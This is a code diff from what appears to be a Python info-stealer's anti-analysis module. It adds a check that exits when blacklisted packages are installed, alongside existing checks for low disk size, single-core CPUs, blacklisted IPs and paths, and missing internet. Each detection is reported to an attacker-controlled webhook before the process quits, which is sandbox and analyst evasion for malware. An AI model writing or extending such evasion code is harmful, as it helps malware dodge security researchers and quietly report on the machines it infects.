@@ -1,20 +1,21 @@
-import time
-import sys
 import ctypes
-import psutil
 import os
+import sys
+import time
 
+import pkg_resources
+import psutil
 import win32api
 
+from ..constants import Lists, UserInfo
 from ..utils.http import hasInternet
 from ..utils.webhook import Webhook
 
-from ..constants import UserInfo, Lists
-
 
 class Miscellanoeus:
-    def __init__(self, webhook_url: str):
+    def __init__(self, webhook_url: str, logger):
         self.webhook_url = webhook_url
+        self.logger = logger
         self.webhook = Webhook(self.webhook_url)
 
     def CheckInternet(self):
@@ -25,7 +26,7 @@ class Miscellanoeus:
                     os._exit(1)
                 else:
                     pass
-            except:
+            except BaseException:
                 pass
 
     def CheckRam(self):
@@ -88,6 +89,21 @@ class Miscellanoeus:
             else:
                 pass
 
+    def CheckImports(self):
+        for package in Lists.BLACKLISTED_IMPORTS:
+            try:
+                dist = pkg_resources.get_distribution(package)
+                if dist:
+                    self.logger.info(f"{package} Was Found Installed: Exit Status 1")
+                    self.webhook.send(
+                    f"`{package}` Was Found Installed On User Machine",
+                    "Miscellaneous")
+                    os._exit(1)
+                else:
+                    pass
+            except pkg_resources.DistributionNotFound:
+                pass
+
     def CheckIPs(self):
         if UserInfo.IP in Lists.BLACKLISTED_IPS:
             self.webhook.send(
@@ -103,17 +119,20 @@ class Miscellanoeus:
             DISK = str(psutil.disk_usage("/")[0] / 1024**3).split(".")[0]
 
             if int(DISK) <= 50:
-                self.webhook.send(f"`{DISK}` Disk Size Is Blacklisted", "Miscellaneous")
+                self.webhook.send(
+                    f"`{DISK}` Disk Size Is Blacklisted",
+                    "Miscellaneous")
                 os._exit(1)
             if int(psutil.cpu_count()) <= 1:
                 self.webhook.send(
-                    f"CPU Core Count Is Less Than Or Equal To `1`", "Miscellaneous"
-                )
+                    f"CPU Core Count Is Less Than Or Equal To `1`",
+                    "Miscellaneous")
                 os._exit(1)
-        except:
+        except BaseException:
             pass
 
     def StartChecks(self):
+        self.CheckImports()
         self.CheckPaths()
         self.CheckIPs()
         self.CheckSpecs()
